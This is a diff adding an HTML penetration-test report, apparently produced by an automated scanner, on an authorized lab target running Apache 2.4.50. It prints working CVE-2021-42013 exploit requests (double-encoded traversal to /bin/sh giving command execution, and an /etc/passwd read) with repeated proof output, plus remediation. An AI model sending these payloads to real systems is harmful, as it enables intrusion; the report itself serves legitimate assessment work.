@@ -1,0 +1,323 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr0n05by-8ah7fw</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Unauthenticated RCE via Apache 2.4.50 path traversal (CVE-2021-42013)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#b00020">CRITICAL</span> [vulnerable-component] Outdated Apache httpd 2.4.50 — CVE-2021-42013 path traversal / RCE</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr0n05by-8ah7fw</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32805/</code></td></tr>
+<tr><td>Started</td><td>2026-06-30T12:42:51.987Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>1 mapped · 1 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>2</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32805</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>2 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">2</b> critical</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Unauthenticated RCE via Apache 2.4.50 path traversal (CVE-2021-42013)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32805/</div>
+<div class="desc">The server runs Apache httpd 2.4.50 (banner: `Apache/2.4.50 (Unix)`), which is vulnerable to CVE-2021-42013 — the incomplete fix for CVE-2021-41773. A path-traversal payload using double-URL-encoded `.%2e` (`.%%32%65`) sequences escapes the document root. Because mod_cgi is enabled and the `/cgi-bin/` ScriptAlias is reachable, the traversal can target `/bin/sh`, allowing an unauthenticated attacker to execute arbitrary OS commands. A POST to `/cgi-bin/.%%32%65/.../bin/sh` with a shell command in the body executed `id` and returned `uid=1(daemon) gid=1(daemon) groups=1(daemon)`, proving command execution as the `daemon` user. Full file-read of arbitrary paths is also possible via the same traversal.</div>
+<div><b>Reproduction</b></div><pre>1. Confirm version: `GET /` → response header `Server: Apache/2.4.50 (Unix)`.
+2. Negative control (no bypass): `POST /cgi-bin/bin/sh` with body `echo Content-Type: text/plain; echo; id` → 404, no command output (ev-mr0n346g-7).
+3. Exploit: `POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` with header `Content-Type: application/x-www-form-urlencoded` and body `echo Content-Type: text/plain; echo; id` → 200, body `uid=1(daemon) gid=1(daemon) groups=1(daemon)`.
+4. Replays ev-mr0n2rnw-6, ev-mr0n35mu-8, ev-mr0n36xx-9 all return the same uid output → stable RCE.
+Remediation: upgrade to Apache httpd &gt;= 2.4.51; disable CGI / restrict filesystem with `Require all denied` on `/`.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0n346g-7</code> — <code>artifacts/s-0001/ev-mr0n346g-7/</code></div><div class="lbl">REQUEST</div><pre>POST /cgi-bin/bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 196
+content-type: text/html; charset=iso-8859-1
+date: Tue, 30 Jun 2026 12:45:09 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.50 (Unix)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0n35mu-8</code> — <code>artifacts/s-0001/ev-mr0n35mu-8/</code></div><div class="lbl">REQUEST</div><pre>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 45
+content-type: text/plain
+date: Tue, 30 Jun 2026 12:45:11 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.50 (Unix)
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0n36xx-9</code> — <code>artifacts/s-0001/ev-mr0n36xx-9/</code></div><div class="lbl">REQUEST</div><pre>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 45
+content-type: text/plain
+date: Tue, 30 Jun 2026 12:45:13 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.50 (Unix)
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0n2rnw-6</code> — <code>artifacts/s-0001/ev-mr0n2rnw-6/</code></div><div class="lbl">REQUEST</div><pre>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 45
+content-type: text/plain
+date: Tue, 30 Jun 2026 12:44:53 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.50 (Unix)
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.50 — CVE-2021-42013 path traversal / RCE</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32805/</div>
+<div class="desc">Server banner &quot;Apache/2.4.50 (Unix)&quot; indicates the httpd build released as the (incomplete) fix for CVE-2021-41773. Apache 2.4.50 remains vulnerable to CVE-2021-42013 (CVSS 9.8): a double-encoding path-traversal allowing arbitrary file read (e.g. /etc/passwd) on Alias'd directories configured with &quot;Require all granted&quot;, and remote code execution where mod_cgi is enabled. Fixed in 2.4.51. This is a version-based detection unless the active PoC below confirms file disclosure.
+
+[+] Also observed as &quot;Apache httpd 2.4.50 — CVE-2021-42013 path traversal → mod_cgi RCE (confirmed)&quot;.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32805/ → response header &quot;Server: Apache/2.4.50 (Unix)&quot;. 2. Compare against CVE-2021-42013 (affects 2.4.49 and 2.4.50; fixed 2.4.51). 3. Active PoC: GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd with --path-as-is.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0n7nez-v</code> — <code>artifacts/_/ev-mr0n7nez-v/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+accept-ranges: bytes
+connection: Keep-Alive
+content-length: 4911
+content-type: text/html
+date: Tue, 30 Jun 2026 12:48:41 GMT
+etag: &quot;132f-6553e04047c00&quot;
+keep-alive: timeout=5, max=100
+last-modified: Sat, 27 Jun 2026 15:38:24 GMT
+server: Apache/2.4.50 (Unix)
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Old-School Developers Portfolio&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header class=&quot;bg-dark text-white text-center py-3&quot;&gt;
+        &lt;h1&gt;Old-School Developers&lt;/h1&gt;
+        &lt;nav class=&quot;navbar navbar-expand-md navbar-dark bg-dark&quot;&gt;
+            &lt;div class=&quot;container&quot;&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                    &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                        &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#about&quot;&gt;About Us&lt;/a&gt;&lt;/li&gt;
+                        &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#projects&quot;&gt;Projects&lt;/a&gt;&lt;/li&gt;
+                        &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#contact&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/nav&gt;
+    &lt;/header&gt;
+    
+    &lt;section id=&quot;about&quot; class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center&quot;&gt;About Us&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-md-6 text-center&quot;&gt;
+                    &lt;img src=&quot;./dev1.jpeg&quot; alt=&quot;John&quot; class=&quot;img-fluid img-thumbnail rounded-circle mb-3&quot;&gt;
+                    &lt;h3&gt;John&lt;/h3&gt;
+                    &lt;p&gt;With over 20 years of experience, Jon has been at the forefront of software development, adapting and thriving with the changes in technology.&lt;/p&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-6 text-center&quot;&gt;
+                    &lt;img src=&quot;./dev2.jpeg&quot; alt=&quot;Peter&quot; class=&quot;img-fluid img-thumbnail rounded-circle mb-3&quot;&gt;
+                    &lt;h3&gt;Peter&lt;/h3&gt;
+                    &lt;p&gt;Specializing in legacy systems, Peter brings a wealth of knowledge and expertise in maintaining and enhancing older technologies.&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+    
+    &lt;section id=&quot;projects&quot; class=&quot;py-5 bg-light&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center&quot;&gt;Our Projects&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-md-6&quot;&gt;
+                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h3 class=&quot;card-title&quot;&gt;NAS (Not A Software)&lt;/h3&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;A pioneering project from the early 2000s, showcasing the resilience and adaptability of our developers.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-6&quot;&gt;
+                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h3 class=&quot;card-title&quot;&gt;Modernizer 200&lt;/h3&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;An innovative solution for modernizing legacy systems without losing the essence of the original technology.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+    
+    &lt;section id=&quot;contact&quot; class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center&quot;&gt;Contact Us&lt;/h2&gt;
+            &lt;form id=&quot;contact-form&quot; class=&quot;mx-auto&quot; style=&quot;max-width: 600px;&quot;&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;name&quot;&gt;Name:&lt;/label&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; name=&quot;name&quot; required&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;email&quot;&gt;Email:&lt;/label&gt;
+                    &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; name=&quot;email&quot; required&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;message&quot;&gt;Message:&lt;/label&gt;
+                    &lt;textarea class=&quot;form-control&quot; id=&quot;message&quot; name=&quot;message&quot; rows=&quot;4&quot; required&gt;&lt;/textarea&gt;
+                &lt;/div&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-block&quot;&gt;Send&lt;/button&gt;
+            &lt;/form&gt;
+            &lt;p id=&quot;success-message&quot; class=&quot;text-success text-center mt-3 d-none&quot;&gt;Thank you for contacting us!&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;footer class=&quot;bg-dark text-white text-center py-3&quot;&gt;
+        &lt;p&gt;&amp;copy; 2024 Old-School Developers&lt;/p&gt;
+    &lt;/footer&gt;
+
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;scripts.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0nabu9-15</code> — <code>artifacts/_/ev-mr0nabu9-15/</code></div><div class="lbl">REQUEST</div><pre>POST /bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 196
+content-type: text/html; charset=iso-8859-1
+date: Tue, 30 Jun 2026 12:50:46 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.50 (Unix)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0nadlk-16</code> — <code>artifacts/_/ev-mr0nadlk-16/</code></div><div class="lbl">REQUEST</div><pre>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 45
+content-type: text/plain
+date: Tue, 30 Jun 2026 12:50:48 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.50 (Unix)
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0naeuo-17</code> — <code>artifacts/_/ev-mr0naeuo-17/</code></div><div class="lbl">REQUEST</div><pre>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
+Host: target.local:32805
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type: text/plain; echo; id</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 45
+content-type: text/plain
+date: Tue, 30 Jun 2026 12:50:50 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.50 (Unix)
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+</div>
+</body></html>
